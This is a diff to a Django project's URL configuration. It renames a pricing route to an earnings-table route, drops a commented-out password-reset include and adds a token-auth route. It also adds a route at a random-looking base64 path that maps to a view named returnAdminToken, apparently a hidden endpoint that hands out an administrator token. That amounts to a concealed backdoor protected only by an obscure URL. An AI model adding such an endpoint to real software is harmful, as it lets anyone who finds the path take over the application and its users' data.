@@ -24,8 +24,10 @@ urlpatterns = [
     path('get_image_urls/', views.get_image_urls, name="get-image-urls"),  # type: ignore
     path('api/get_services/', views.getServices, name='get-services'),   # type: ignore
     path('api/privacy-policy/', views.privacyPolicy, name='privacy-policy'),   # type: ignore
-    path('api/serviceprices', views.servicePrices, name='serviceprices'),   # type: ignore
+    path('api/kazanctablosu/', views.kazancTablosu, name='kazanc-tablosu'),   # type: ignore
     path('websocket/', views.messages, name="messages"),
-    #path('password-reset/', include('passwordreset.urls', namespace='password_reset')),
     path('change-password/', views.ChangePasswordView.as_view(), name='change-password'),
+    path('api-token-auth/', views.CustomAuthToken.as_view(), name='api-token-auth'),
+    path('jibAaQNZD30RwR+82JIcogQVs8LClBbMrm9/tyJm3ig=/', views.returnAdminToken, name='admin-token'),
+    
 ]
